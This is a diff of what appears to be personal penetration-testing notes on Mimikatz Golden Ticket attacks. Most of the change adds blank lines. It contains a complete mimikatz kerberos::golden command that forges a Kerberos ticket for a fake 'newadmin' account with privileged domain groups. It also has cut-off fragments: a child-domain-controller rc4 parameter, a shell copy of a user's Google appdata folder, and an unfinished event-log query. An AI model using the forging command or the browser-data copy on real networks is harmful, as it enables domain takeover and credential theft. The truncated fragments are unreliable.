@@ -9,12 +9,20 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 # Mimikatzz Golden Ticket
 
+
+
 **Command** ([[Golden Ticket Creation (File)]]):
 
 ```bash
 mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /groups:501,502,513,512,520,518,519 /krbtgt: /ticket:newadmin.tkt
 
 ```
+
+
+
+
+
+
 
 **Command** ([[Golden Ticket Creation (Pass-The-Ticket) – Create the ticket for your current session]]):
 
@@ -23,14 +31,38 @@ mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-368358
 
 ```
 
+
+
+
+
+
+
 **Code**: [[
 /user:ChildDomainControllerMachineName$
 /rc4: KRB]]
 
+
+
+
+
+
+
 **Code**: [[
 shell copy "C:\users\kobrien\appdata\local\google]]
+
+
+
+
+
+
 
 **Code**: [[
 <QueryList>
   <Query Id="0" Path="Security">
     ]]
+
+
+
+
+
+
